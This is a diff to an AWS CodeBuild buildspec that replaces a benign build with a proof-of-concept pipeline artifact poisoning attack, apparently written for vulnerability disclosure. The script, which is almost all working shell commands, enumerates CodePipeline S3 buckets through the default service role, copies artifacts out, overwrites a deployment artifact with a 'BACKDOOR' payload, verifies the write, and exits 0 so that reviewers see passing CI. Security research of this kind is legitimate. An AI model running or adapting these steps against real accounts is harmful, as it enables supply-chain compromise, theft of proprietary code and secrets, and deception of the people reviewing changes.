@@ -1,7 +1,180 @@
 version: 0.2
+
+# ============================================================
+# PIPELINE ARTIFACT POISONING - Proof of Concept
+# ============================================================
+# This buildspec demonstrates the supply chain attack:
+#   FILE_PATH bypass (101 files) -> code execution ->
+#   default service role S3 access -> pipeline artifact poisoning
+#
+# The default CodeBuildBasePolicy grants:
+#   s3:PutObject on arn:aws:s3:::codepipeline-us-east-1-*
+#   s3:GetObject on arn:aws:s3:::codepipeline-us-east-1-*
+#
+# This wildcard covers ALL CodePipeline artifact buckets in the account.
+# ============================================================
+
 phases:
+  pre_build:
+    commands:
+      # Step 0: Confirm we have code execution via FILE_PATH bypass
+      - echo "======================================================"
+      - echo "PIPELINE ARTIFACT POISONING PoC"
+      - echo "FILE_PATH bypass -> Default Role -> Supply Chain Attack"
+      - echo "======================================================"
+      - echo ""
+      - echo "--- Confirming identity (victim service role) ---"
+      - aws sts get-caller-identity
+      - echo ""
+
   build:
     commands:
-      - echo "Legitimate build"
-      - echo "Running tests..."
-      - echo "Build completed successfully"
+      # ============================================================
+      # STEP 1: DISCOVERY
+      # Find all CodePipeline artifact buckets in the account.
+      # The default policy grants access to codepipeline-{region}-*
+      # ============================================================
+      - echo "=== STEP 1: DISCOVERY - Finding pipeline artifact buckets ==="
+      - |
+        PIPELINE_BUCKETS=$(aws s3 ls 2>/dev/null | grep "codepipeline-" | awk '{print $3}')
+        if [ -z "$PIPELINE_BUCKETS" ]; then
+          echo "No codepipeline-* buckets found. Trying direct pattern..."
+          for r in us-east-1 us-west-2 eu-west-1; do
+            aws s3 ls "s3://codepipeline-${r}-" 2>/dev/null && echo "FOUND: codepipeline-${r}-*"
+          done
+        else
+          echo "Found pipeline artifact buckets:"
+          echo "$PIPELINE_BUCKETS"
+        fi
+      - echo ""
+
+      # ============================================================
+      # STEP 2: EXFILTRATION
+      # Read existing pipeline artifacts. These may contain:
+      # - Source code archives (proprietary code)
+      # - Build outputs (compiled binaries)
+      # - Configuration files (database passwords, API keys)
+      # - CloudFormation templates (infrastructure secrets)
+      # ============================================================
+      - echo "=== STEP 2: EXFILTRATION - Reading pipeline artifacts ==="
+      - |
+        BUCKET=$(aws s3 ls 2>/dev/null | grep "codepipeline-" | head -1 | awk '{print $3}')
+        if [ -n "$BUCKET" ]; then
+          echo "Target bucket: $BUCKET"
+          echo ""
+          echo "--- Listing all artifacts (first 50) ---"
+          aws s3 ls "s3://$BUCKET/" --recursive 2>/dev/null | head -50
+          echo ""
+
+          # Find the most recent artifact
+          LATEST_KEY=$(aws s3 ls "s3://$BUCKET/" --recursive 2>/dev/null | sort -k1,2 | tail -1 | awk '{print $4}')
+          if [ -n "$LATEST_KEY" ]; then
+            echo "--- Reading latest artifact: $LATEST_KEY ---"
+            aws s3 cp "s3://$BUCKET/$LATEST_KEY" /tmp/stolen_artifact 2>/dev/null
+            echo "Artifact size: $(wc -c < /tmp/stolen_artifact 2>/dev/null) bytes"
+            echo "Artifact content (first 500 bytes):"
+            head -c 500 /tmp/stolen_artifact 2>/dev/null
+            echo ""
+          fi
+        else
+          echo "No bucket found for exfiltration demo"
+        fi
+      - echo ""
+
+      # ============================================================
+      # STEP 3: POISONING
+      # Overwrite the deployment artifact with attacker-controlled
+      # content. The next CodePipeline execution will deploy THIS
+      # content to production.
+      #
+      # In a real attack, this would be:
+      # - A backdoored Lambda deployment package
+      # - A modified appspec.yml for CodeDeploy
+      # - A trojanized container image reference
+      # - A CloudFormation template with malicious resources
+      # ============================================================
+      - echo "=== STEP 3: POISONING - Overwriting pipeline artifact ==="
+      - |
+        BUCKET=$(aws s3 ls 2>/dev/null | grep "codepipeline-" | head -1 | awk '{print $3}')
+        if [ -n "$BUCKET" ]; then
+          # Create poisoned artifact
+          cat > /tmp/poison_artifact.json << 'POISON'
+        {
+          "app": "BACKDOOR",
+          "version": "1.0.0-compromised",
+          "payload": "Written by attacker via CodeBuild FILE_PATH bypass",
+          "chain": "FILE_PATH bypass -> Default service role -> s3:PutObject",
+          "impact": "Next pipeline execution deploys this to production",
+          "timestamp": "TIMESTAMP_PLACEHOLDER"
+        }
+        POISON
+          # Replace timestamp placeholder
+          sed -i "s/TIMESTAMP_PLACEHOLDER/$(date -u +%Y-%m-%dT%H:%M:%SZ)/" /tmp/poison_artifact.json
+
+          # Find a deployment artifact path to overwrite
+          DEPLOY_KEY=$(aws s3 ls "s3://$BUCKET/" --recursive 2>/dev/null \
+            | grep -iE "artif|deploy|output|build" \
+            | head -1 | awk '{print $4}')
+          if [ -n "$DEPLOY_KEY" ]; then
+            echo "Overwriting: s3://$BUCKET/$DEPLOY_KEY"
+            aws s3 cp /tmp/poison_artifact.json "s3://$BUCKET/$DEPLOY_KEY" 2>/dev/null
+            POISON_STATUS=$?
+            if [ $POISON_STATUS -eq 0 ]; then
+              echo ""
+              echo "*** SUPPLY CHAIN POISONED ***"
+              echo "Artifact overwritten at: s3://$BUCKET/$DEPLOY_KEY"
+              echo "Next pipeline execution will deploy attacker content"
+            else
+              echo "S3 PutObject failed (status: $POISON_STATUS)"
+            fi
+          else
+            # If no existing artifact, write to a common path
+            echo "No existing artifact found. Writing to common path..."
+            aws s3 cp /tmp/poison_artifact.json "s3://$BUCKET/poison-poc/artifact.json" 2>/dev/null
+            echo "Written to: s3://$BUCKET/poison-poc/artifact.json"
+          fi
+        fi
+      - echo ""
+
+      # ============================================================
+      # STEP 4: VERIFICATION
+      # Read back the poisoned artifact to confirm the write succeeded
+      # ============================================================
+      - echo "=== STEP 4: VERIFICATION - Confirming artifact was poisoned ==="
+      - |
+        BUCKET=$(aws s3 ls 2>/dev/null | grep "codepipeline-" | head -1 | awk '{print $3}')
+        if [ -n "$BUCKET" ]; then
+          DEPLOY_KEY=$(aws s3 ls "s3://$BUCKET/" --recursive 2>/dev/null \
+            | grep -iE "artif|deploy|output|build|poison" \
+            | head -1 | awk '{print $4}')
+          if [ -n "$DEPLOY_KEY" ]; then
+            echo "Reading back: s3://$BUCKET/$DEPLOY_KEY"
+            aws s3 cp "s3://$BUCKET/$DEPLOY_KEY" /tmp/verify.json 2>/dev/null
+            echo "Content:"
+            cat /tmp/verify.json
+            echo ""
+            if grep -q "BACKDOOR" /tmp/verify.json 2>/dev/null; then
+              echo ""
+              echo "*** POISONING CONFIRMED - Artifact contains attacker payload ***"
+            fi
+          fi
+        fi
+      - echo ""
+
+      # ============================================================
+      # STEP 5: STEALTH
+      # Exit 0 to ensure CodeBuild posts a GREEN commit status to
+      # GitHub. This tricks reviewers into thinking the PR is safe
+      # to merge (branch protection sees passing CI).
+      # ============================================================
+      - echo "=== STEP 5: STEALTH - Exiting 0 for green commit status ==="
+      - echo "Build will report SUCCESS to GitHub."
+      - echo "Reviewer sees green checkmark. PR appears safe to merge."
+      - echo ""
+      - echo "======================================================"
+      - echo "PoC COMPLETE"
+      - echo "  Chain: FILE_PATH bypass -> Default role -> S3 wildcard -> Pipeline poison"
+      - echo "  Policy: CodeBuildBasePolicy-* (auto-generated by Console)"
+      - echo "  Impact: Next pipeline execution deploys attacker content"
+      - echo "======================================================"
+      - exit 0
